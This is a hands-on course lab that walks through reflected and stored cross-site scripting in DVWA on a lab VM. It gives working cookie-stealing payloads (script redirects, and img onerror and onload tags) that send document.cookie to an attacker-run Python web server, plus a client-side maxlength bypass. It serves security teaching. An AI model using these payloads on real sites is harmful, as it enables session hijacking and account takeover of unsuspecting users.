---
title: "Activity: XSS"
description: A hands-on activity exploring XSS with DVWA
published: true
include_toc: true
slug: xss
---

# Setup

For this activity, run virt-manager and start your Metasploitable VM. Browse to <http://192.168.56.102/dvwa> from a browser with Kali and log with username `admin` and password `password`.

**Important:** On the menu on the left, select "DVWA Security" and change the security level to "low".

Select SQL Injection, and click "View Help" and "View Source" to understand what SQL query is being used.

---

**Objective:** Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.


# XSS -- Reflected

In DVWA, select `XSS reflected`.



## Be annoying

Enter the following tag in the `name` field

```html
<h1>Hello world!</h1>
```

This shows that the field is rendering HTML. Therefore, we could try using the script tag.

```html
<script>alert("You have been hacked!")</script>
```

View the source code to see that the fully formed `<script>` tags are there.

This is annoying, but could we do something dangerous, like steal the authentication cookie so we could log in as the user?

## Steal a cookie

Enter the following into the `name` field

```html
<script>alert(document.cookie)</script>
```

Now we see the cookie. We could send a social engineering attack to the user to have them click on a link, like this (URL copied from result):

```html
http://127.0.0.1:42001/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E#
```

This would `alert` the victim's cookie in the victim's browser, but the cookie would only displayed on the victim's computer. We can change that by running our own webserver and referencing our server in our URL. Run the following in a shell on kali to start a web server on Kali on port 8888:

```shell
python3 -m http.server 8888
```

And craft a new attack by entering the following into the `name` field:

```html
<script>window.location='http://127.0.0.1:8888/?cookie='+ document.cookie</script>
```

This sent the cookie to us, the attacker. You could copy the new URL from the browser and send it to a victim, to get their cookie.

{% include lab-image.html image='python-webserver-dvwa-xss.png' %}

This approach works, but it could be confusing or alarming to the victim because the page is redirected because of the `window.location` script instruction. To avoid this redirection, we could use different method of using an `img` instead.

## Use HTML `img` `onerror` attribute

The following site shows a list of other tags and events we could use besides the script tag.

<https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>

{% include lab-image.html image='portswigger-xss-cheat-sheet.png' %}

We could load a non-existent image and run our code within its `onerror` event:

```html
<img src=x onerror=this.src='http://127.0.0.1:8888/?c='+document.cookie>
```

Submit the above into the `name` field of the `XSS Reflected` page in order to get a new URL. Then, verify that this cookie is obtained in the Python HTTP server log. This works, but a drawback is that it constantly refreshes the page.

Alternatively, this page will load an actual icon (but with 0-size width and height to be invisible to the user) so that page will not refresh (all one line):

```html
<img src=http://192.168.56.102/dvwa/favicon.ico width=0 height=0 onload=this.src='http://127.0.0.1:8888/?c='+document.cookie>
```

# XSS -- stored

Visit the `XSS Stored` page of DVWA. Enter the following line into the comment field:

```html
<script>alert("You have been hacked!")</script>
```

Now navigate to a different page and come back to the XSS Stored page. See that the message is repeated every time the page is loaded. Any visitor who visits the page will receive our XSS attack.

Now try our cookie-stealing attack from before. Enter the following into the "comment" field:

```html
<img src=http://192.168.56.102/dvwa/favicon.ico width=0 height=0 onload=this.src='http://127.0.0.1:8888/?c='+document.cookie>
```

Except, there is a problem -- the comment field has truncated the input: 

{% include lab-image.html image='dvwa-comment-truncated.png' %}

However, this restriction is imposed by the web browser, and therefore, we can bypass it. Right-click the comment field and select "Inspect element":

{% include lab-image.html image='dvwa-inspect-element.png' %}

This will highlight the comment field in the Document Object Model (DOM) held by the browser for this page. Double-click the `maxlength` attribute on the highlighted `textarea` element. Delete the value between the double-quotes. 

{% include lab-image.html image='dvwa-edit-maxlength.png' %}

Press `enter` to commit the change. Then, attempt again to paste in our cookie-stealing attack. It should now be possible to post the entire attack to the "comment" box:

{% include lab-image.html image='dvwa-maxlength-edited.png' %}

Enter a "name" for your malicious post, and submit the comment. The page should reload, and your attack should now work for anyone who visits the page. Confirm this by checking whether your python http server received the cookie for the page refresh.







<!-- # XSS -- DOM   -->

<!-- This requires a newer version of DVWA. Available via docker... -->

<!--

Visit the `XSS DOM` page of DVWA.

Show that you can change the default language, which changes a URL parameter. 

In the URL, change the parameter value from "German" to:

```html
http://127.0.0.1:42001/vulnerabilities/xss_d/?default=<script>alert("You have been hacked!")</script>
````

Then try:

```html
http://127.0.0.1:42001/vulnerabilities/xss_d/?default=<script>window.location='http://127.0.0.1:8888/?cookie='+ document.cookie</script>
``` 

-->


# Learn more

To learn more, experiment with this extensive list of XSS filter evasion techniques from OWASP:

<https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>


